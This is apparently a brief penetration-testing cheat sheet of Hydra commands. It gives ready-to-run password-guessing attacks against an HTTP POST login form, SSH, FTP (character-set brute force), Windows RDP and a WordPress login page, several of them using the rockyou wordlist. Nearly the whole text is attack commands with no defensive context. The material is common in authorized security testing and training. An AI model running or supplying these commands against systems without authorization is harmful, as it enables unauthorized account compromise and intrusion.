### Hydra

Crack an HTTP POST web form login:

```fundamental

hydra -o hydra_results.txt -l admin -P rockyou.txt somesite.com -s nonstandardport http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed!'

```


Crack a Secure Shell login:

```fundamental

hydra -o hydra_results.txt -L users.txt -P rockyou.txt 192.168.8.5 ssh

```

Brute force attack:
```fundamental

hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp

```



Attack a Windows Remote Desktop with a password list.
```
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
``` 


Craft a more specific request for Hydra to brute force.
```
hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```